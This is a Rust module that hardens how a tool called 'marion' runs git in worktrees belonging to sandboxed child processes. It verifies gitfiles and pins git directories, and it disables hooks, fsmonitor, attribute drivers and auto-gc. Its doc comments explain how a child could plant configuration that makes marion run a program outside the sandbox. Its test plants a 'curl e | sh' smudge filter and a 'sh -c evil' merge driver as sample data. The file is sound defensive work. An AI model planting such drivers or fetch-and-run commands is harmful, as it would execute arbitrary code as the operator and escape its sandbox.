//! **The one way marion runs git on a tree**, hardened against configuration a child can plant.
//!
//! A child runs in a worktree marion made, and it can write anything in that directory — including
//! the `.git` gitfile that tells git where the repository is. A child that replaces the gitfile
//! with a directory of its own (or points it at one) chooses the `config` every later marion git
//! call in that tree reads: `core.fsmonitor`, a hook path, a filter. marion runs `diff`, `add`,
//! `commit` and `worktree add` there as the operator, outside any sandbox the child had, so a
//! planted `core.fsmonitor` would be a program the child picked, run by marion.
//!
//! So every call goes through [`command`], which:
//!
//! * for a [`Tree::Child`], checks that `.git` is still a regular file naming a worktree registered
//!   under the operator's repository (`<common-dir>/worktrees/<name>`, whose own `gitdir` names this
//!   tree back), and refuses by name otherwise; then pins `--git-dir`, `--work-tree` **and the
//!   common directory** (`GIT_COMMON_DIR`, asked of the operator's own checkout), so nothing in the
//!   tree decides where git reads from, and disables hooks (`core.hooksPath=/dev/null`) as well as
//!   fsmonitor. The common directory is pinned because the worktree's admin directory
//!   (`<common-dir>/worktrees/<name>`) is the child's to write — its sandbox must let git update
//!   its index and HEAD there — and the `commondir` file in it would otherwise name the repository,
//!   config included, that marion's git reads. A `config.worktree` the child left there is refused
//!   unless it holds only sparse-checkout settings;
//! * for a child tree, and for the checkout that makes one, applies **no attributes but the
//!   operator's own `info/attributes`**: `GIT_ATTR_SOURCE` is the empty tree and
//!   `core.attributesFile` is `/dev/null`. A `.gitattributes` in the tree is the child's (or the
//!   cloned repository's), and naming a driver there chooses which of the operator's filter, diff
//!   and merge programs marion runs on the child's content. So a `git-lfs` file reaches a child as
//!   its pointer, and its pointer is what lands. `GIT_ATTR_SOURCE` needs git 2.40; an older git
//!   ignores it and still reads the tree's attributes, which docs/os-sandbox.md states. The system
//!   attributes file is skipped too (`GIT_ATTR_NOSYSTEM`). `info/attributes` has no switch: git
//!   reads it whatever the variables say, so where it exists **and** the repository's own
//!   configuration names a driver program ([`attribute_drivers`]), the call is refused by name —
//!   a child able to write both would otherwise choose a program marion's git runs unsandboxed;
//! * for a child tree and the checkout that makes one, turns automatic `gc` and `maintenance` off
//!   (`gc.auto=0`, `maintenance.auto=false`);
//! * for a [`Tree::Operator`] (the operator's own checkout: a root's tree, a `shared-cwd` child's
//!   directory, the repository a worktree is added to) disables fsmonitor only. **Hooks stay the
//!   operator's**: `git worktree add` runs their `post-checkout` hook exactly as their own `git`
//!   would, because that hook is theirs, set up in their repository, and a worktree without it can
//!   differ from one they made by hand. fsmonitor is disabled even here because it runs on reads
//!   marion makes on the operator's behalf, and nothing marion reads needs it;
//! * always sets `GIT_TERMINAL_PROMPT=0`, so no call can stop and ask for a password, and clears
//!   every variable that would redirect git elsewhere or inject configuration
//!   ([`marion_harness::env_filter::GIT_REDIRECTING`], through
//!   [`marion_harness::env_filter::git_command`]).
//!
//! The operator's identity and global configuration are kept: `GIT_CONFIG_GLOBAL` and
//! `GIT_CONFIG_NOSYSTEM` are not set, so commits carry their name and their own settings apply.

use std::path::{Path, PathBuf};
use std::process::Command;

use crate::spawn::SpawnError;

/// Where a marion git call runs, and how far its configuration is trusted.
#[derive(Debug, Clone, Copy)]
pub enum Tree<'a> {
    /// A worktree marion made for a child. `repo` is the operator's repository it was added to
    /// (any worktree of it, or its main checkout): the anchor the gitfile is checked against.
    Child { wt: &'a Path, repo: &'a Path },
    /// The operator's own checkout.
    Operator(&'a Path),
}

impl<'a> Tree<'a> {
    /// The directory the call runs in.
    pub fn dir(&self) -> &'a Path {
        match self {
            Tree::Child { wt, .. } => wt,
            Tree::Operator(dir) => dir,
        }
    }
}

/// A `git` command for `args` on `tree`, hardened as the module doc says, with stdin closed and
/// both outputs piped. A child tree whose `.git` is not the gitfile git wrote is refused here,
/// before any git process runs in it.
pub fn command(tree: &Tree<'_>, args: &[&str]) -> Result<Command, SpawnError> {
    built(tree, args, false)
}

/// [`command`] for a checkout that **makes a child's tree** (`worktree add`): the same hardening,
/// plus the child-tree attribute rule even where `tree` is the operator's own checkout, so the new
/// tree is written exactly as marion's later git calls in it read it — a filter that smudged on
/// the way in and is not run on the way back would show every filtered file as changed.
pub fn checkout_command(tree: &Tree<'_>, args: &[&str]) -> Result<Command, SpawnError> {
    built(tree, args, true)
}

fn built(tree: &Tree<'_>, args: &[&str], makes_child_tree: bool) -> Result<Command, SpawnError> {
    let mut cmd = marion_harness::env_filter::git_command();
    cmd.env("GIT_TERMINAL_PROMPT", "0")
        .current_dir(tree.dir())
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    match tree {
        Tree::Child { wt, repo } => {
            let pinned = verified(wt, repo)?;
            cmd.env("GIT_COMMON_DIR", &pinned.common)
                .arg(format!("--git-dir={}", pinned.gitdir.display()))
                .arg(format!("--work-tree={}", wt.display()))
                .args([
                    "-c",
                    "core.fsmonitor=false",
                    "-c",
                    "core.hooksPath=/dev/null",
                ]);
            without_tree_attributes(&mut cmd, &pinned.common_dir, repo)?;
            cmd.args(NO_MAINTENANCE);
        }
        Tree::Operator(repo) => {
            cmd.args(["-c", "core.fsmonitor=false"]);
            if makes_child_tree {
                without_tree_attributes(&mut cmd, &common_dir(repo)?, repo)?;
                cmd.args(NO_MAINTENANCE);
            }
        }
    }
    cmd.args(args);
    Ok(cmd)
}

/// No automatic `gc` or `maintenance` after a call that touches a child's tree: those would
/// repack, prune and run tasks over the shared repository, child-written objects included, as
/// the operator and outside the call marion meant to make. The operator's own git still runs them.
/// The home screen's merge sets it too (`home/session.rs`): a merge's auto-gc would pack the
/// branch's child-written objects in the operator's repository the same way.
pub(crate) const NO_MAINTENANCE: [&str; 4] = ["-c", "gc.auto=0", "-c", "maintenance.auto=false"];

/// The empty tree's id in each object format git has: the attribute source that names no
/// attributes. git knows it without its being in the object store.
const EMPTY_TREE_SHA1: &str = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
const EMPTY_TREE_SHA256: &str = "6ef19b41225c5369f1c104d45d8d85efa9b057b53b14b4b9b939dd74decc5321";

/// No attributes from the tree, the operator's global attributes file or the system's, and a
/// refusal where `info/attributes` could select a driver the repository's own configuration
/// names. See the module doc.
fn without_tree_attributes(
    cmd: &mut Command,
    common: &CommonDir,
    repo: &Path,
) -> Result<(), SpawnError> {
    refuse_info_attribute_drivers(&common.path, repo)?;
    let empty = match common.object_format.as_str() {
        "sha256" => EMPTY_TREE_SHA256,
        _ => EMPTY_TREE_SHA1,
    };
    cmd.env("GIT_ATTR_SOURCE", empty)
        .env("GIT_ATTR_NOSYSTEM", "1")
        .args(["-c", "core.attributesFile=/dev/null"]);
    Ok(())
}

/// Refuse while `<common>/info/attributes` holds anything and `repo`'s own configuration names a
/// driver program. Without the file no attribute selects a driver (the others are switched off),
/// so the common case costs one `stat` and no git process.
fn refuse_info_attribute_drivers(common: &Path, repo: &Path) -> Result<(), SpawnError> {
    let file = common.join("info").join("attributes");
    match std::fs::metadata(&file) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Ok(m) if m.len() == 0 => return Ok(()),
        _ => {}
    }
    let refused = |why: String| {
        SpawnError::Git(
            "attribute check",
            format!(
                "{} exists and {why}; an attribute there would make marion's git run that program \
                 on a child's tree, so marion runs none there (remove one or the other)",
                file.display()
            ),
        )
    };
    match attribute_drivers(repo) {
        Ok(keys) if keys.is_empty() => Ok(()),
        Ok(keys) => Err(refused(format!(
            "this repository's own config sets {}",
            keys.join(", ")
        ))),
        Err(e) => Err(refused(format!(
            "the repository's config could not be read ({e})"
        ))),
    }
}

/// The refusal for a child tree whose `.git` marion no longer recognises.
fn tampered(wt: &Path, why: impl std::fmt::Display) -> SpawnError {
    SpawnError::Git(
        "worktree check",
        format!(
            "{}/.git is not the gitfile git wrote for this worktree ({why}); marion runs no git \
             command in it, because its configuration would then be the child's",
            wt.display()
        ),
    )
}

/// A child worktree's git directory, proven to be the one registered for it, and the operator's
/// common directory it belongs to, read from the operator's checkout rather than from the
/// worktree's own (child-writable) `commondir` file.
struct Pinned {
    gitdir: PathBuf,
    common: PathBuf,
    common_dir: CommonDir,
}

/// **The git directory of child worktree `wt`, proven to be the one registered for it.**
///
/// `.git` must be a regular file (not a directory, not a symlink) reading `gitdir: <path>`; that
/// path must sit directly under `<common-dir>/worktrees/` of the operator's repository `repo`; and
/// its `gitdir` file — git's back-link — must name this tree's `.git`. A child can rewrite its
/// gitfile, but not the operator's `worktrees/` directory, so it can point the gitfile neither at
/// a repository of its own nor at a sibling's registration.
fn verified(wt: &Path, repo: &Path) -> Result<Pinned, SpawnError> {
    let pinned = registered(wt, repo)?;
    check_worktree_config(wt, &pinned.gitdir)?;
    Ok(pinned)
}

/// **The admin dir of the linked worktree `wt`, proven registered under `repo`** — the one a
/// node's OS sandbox may write ([`marion_harness::adapter::Extras::git_admin_dir`]). The same
/// proof as [`verified`]'s gitfile check, so a node that rewrote its `.git` to name the
/// operator's repository (or anything else) is granted nothing. `None` for a main checkout,
/// whose `.git` is a directory inside `wt` already, and for any tree that fails the proof.
pub fn admin_dir(wt: &Path, repo: &Path) -> Option<PathBuf> {
    let meta = std::fs::symlink_metadata(wt.join(".git")).ok()?;
    if !meta.file_type().is_file() {
        return None;
    }
    registered(wt, repo).ok().map(|p| p.gitdir)
}

/// [`verified`] without the `config.worktree` check: the gitfile and its registration alone.
fn registered(wt: &Path, repo: &Path) -> Result<Pinned, SpawnError> {
    let dot_git = wt.join(".git");
    let meta = std::fs::symlink_metadata(&dot_git).map_err(|e| tampered(wt, e))?;
    if !meta.file_type().is_file() {
        return Err(tampered(wt, "it is not a regular file"));
    }
    let text = std::fs::read_to_string(&dot_git).map_err(|e| tampered(wt, e))?;
    let named = text
        .strip_prefix("gitdir: ")
        .map(str::trim_end)
        .filter(|p| !p.is_empty() && !p.contains('\n'))
        .ok_or_else(|| tampered(wt, "it does not read `gitdir: <path>`"))?;
    let named = Path::new(named);
    let named = if named.is_absolute() {
        named.to_path_buf()
    } else {
        wt.join(named)
    };
    let gitdir = named.canonicalize().map_err(|e| tampered(wt, e))?;
    let common_dir = common_dir(repo)?;
    let common = common_dir
        .path
        .canonicalize()
        .map_err(|e| tampered(wt, e))?;
    if gitdir.parent() != Some(common.join("worktrees").as_path()) {
        return Err(tampered(
            wt,
            format!(
                "it names {}, not a worktree of this repository",
                gitdir.display()
            ),
        ));
    }
    let back = std::fs::read_to_string(gitdir.join("gitdir")).map_err(|e| tampered(wt, e))?;
    let back = Path::new(back.trim_end())
        .canonicalize()
        .map_err(|e| tampered(wt, e))?;
    let ours = dot_git.canonicalize().map_err(|e| tampered(wt, e))?;
    if back != ours {
        return Err(tampered(wt, "its registration names another tree"));
    }
    Ok(Pinned {
        gitdir,
        common,
        common_dir,
    })
}

/// The `config.worktree` keys a child's admin directory may hold: the ones `git worktree add` and
/// `git sparse-checkout` write. Any other key — a filter, a pager, an `include.path` — is
/// configuration the child chose, read by marion's git where the operator's repository enables
/// `extensions.worktreeConfig`.
const WORKTREE_CONFIG_KEYS: [&str; 3] = [
    "core.sparsecheckout",
    "core.sparsecheckoutcone",
    "index.sparse",
];

/// Refuse a child's `config.worktree` that sets anything but [`WORKTREE_CONFIG_KEYS`]. Read with
/// `git config --file`, which follows no `include` and reads no repository.
fn check_worktree_config(wt: &Path, gitdir: &Path) -> Result<(), SpawnError> {
    let file = gitdir.join("config.worktree");
    match std::fs::symlink_metadata(&file) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(tampered(wt, e)),
        Ok(m) if !m.file_type().is_file() => {
            return Err(tampered(wt, "its config.worktree is not a regular file"));
        }
        Ok(_) => {}
    }
    let mut cmd = marion_harness::env_filter::git_command();
    cmd.current_dir("/")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .arg("config")
        .arg("--file")
        .arg(&file)
        .args(["--list", "--name-only"])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    let out = crate::spawn_receive_gate::SPAWN_RECEIVE_GATE
        .spawn(&mut cmd)?
        .wait_with_output()?;
    if !out.status.success() {
        return Err(tampered(wt, "its config.worktree does not parse"));
    }
    let names = String::from_utf8_lossy(&out.stdout);
    match names
        .lines()
        .find(|k| !WORKTREE_CONFIG_KEYS.contains(&k.to_ascii_lowercase().as_str()))
    {
        Some(key) => Err(tampered(
            wt,
            format!("its config.worktree sets {key:?}, which marion does not read from a child"),
        )),
        None => Ok(()),
    }
}

/// A repository's common git directory and its object format.
struct CommonDir {
    path: PathBuf,
    object_format: String,
}

/// `repo`'s common git directory, absolute, and its object format, asked of git on the operator's
/// own checkout.
fn common_dir(repo: &Path) -> Result<CommonDir, SpawnError> {
    let mut cmd = command(
        &Tree::Operator(repo),
        &["rev-parse", "--git-common-dir", "--show-object-format"],
    )?;
    let out = crate::spawn_receive_gate::SPAWN_RECEIVE_GATE
        .spawn(&mut cmd)?
        .wait_with_output()?;
    if !out.status.success() {
        return Err(SpawnError::Git(
            "rev-parse --git-common-dir",
            String::from_utf8_lossy(&out.stderr).trim().to_string(),
        ));
    }
    let text = String::from_utf8_lossy(&out.stdout);
    let mut lines = text.lines();
    let p = PathBuf::from(lines.next().unwrap_or_default().trim());
    Ok(CommonDir {
        path: if p.is_absolute() { p } else { repo.join(p) },
        object_format: lines.next().unwrap_or("sha1").trim().to_string(),
    })
}

/// **The driver programs the repository's own configuration names**: each `filter.<name>.clean`,
/// `.smudge` or `.process` and `merge.<name>.driver` key set at `local` or `worktree` scope
/// (includes followed) in the operator's checkout `repo`. That configuration is the one file
/// every child worktree shares and may have written, and an attribute — in a branch's
/// `.gitattributes` or in `info/attributes` beside it — selects such a driver, so a merge or a
/// checkout would run its program as the operator. The operator's global and system drivers are
/// theirs and not listed. `Err` where git could not say.
pub fn repo_drivers(repo: &Path) -> Result<Vec<String>, String> {
    local_keys(
        repo,
        r"^(filter\..*\.(clean|smudge|process)|merge\..*\.driver)$",
    )
}

/// [`repo_drivers`] plus each `diff.<name>.textconv` and `.command`: every program an attribute
/// can select, for the git calls marion makes on a child's tree, which include diffs.
pub fn attribute_drivers(repo: &Path) -> Result<Vec<String>, String> {
    local_keys(
        repo,
        r"^(filter\..*\.(clean|smudge|process)|merge\..*\.driver|diff\..*\.(textconv|command))$",
    )
}

/// **The keys matching `regex` set at `local` or `worktree` scope** (includes followed) in the
/// operator's checkout `repo`: the configuration a child worktree shares and may have written.
/// `Err` where git could not say.
pub fn local_keys(repo: &Path, regex: &str) -> Result<Vec<String>, String> {
    let out = command(
        &Tree::Operator(repo),
        &[
            "config",
            "--show-scope",
            "--includes",
            "--get-regexp",
            regex,
        ],
    )
    .map_err(|e| e.to_string())?
    .output()
    .map_err(|e| e.to_string())?;
    // `git config --get-regexp` exits 1 when nothing matches.
    match out.status.code() {
        Some(0) => {}
        Some(1) => return Ok(Vec::new()),
        _ => return Err(String::from_utf8_lossy(&out.stderr).trim().to_string()),
    }
    Ok(String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| {
            let (scope, rest) = l.split_once('\t')?;
            let key = rest.split_whitespace().next()?;
            matches!(scope, "local" | "worktree").then(|| key.to_string())
        })
        .collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let st = marion_harness::env_filter::git_command()
            .current_dir(dir)
            .args(args)
            .stdout(std::process::Stdio::null())
            .status()
            .unwrap();
        assert!(st.success(), "git {args:?}");
    }

    /// **A driver program in the repository's own configuration is named**, filter and merge
    /// alike, while its plain merge settings are not drivers and nothing is named where there is
    /// none.
    #[test]
    fn the_repositorys_own_driver_programs_are_named() {
        let dir = marion_testsupport::scratch("gitcmd-drivers");
        git(&dir, &["init", "-q"]);
        assert_eq!(repo_drivers(&dir).unwrap(), Vec::<String>::new());
        git(&dir, &["config", "merge.conflictStyle", "diff3"]);
        assert_eq!(repo_drivers(&dir).unwrap(), Vec::<String>::new());
        git(&dir, &["config", "filter.x.smudge", "curl e | sh"]);
        git(&dir, &["config", "merge.y.driver", "sh -c evil %O %A %B"]);
        assert_eq!(
            repo_drivers(&dir).unwrap(),
            ["filter.x.smudge", "merge.y.driver"]
        );
    }
}
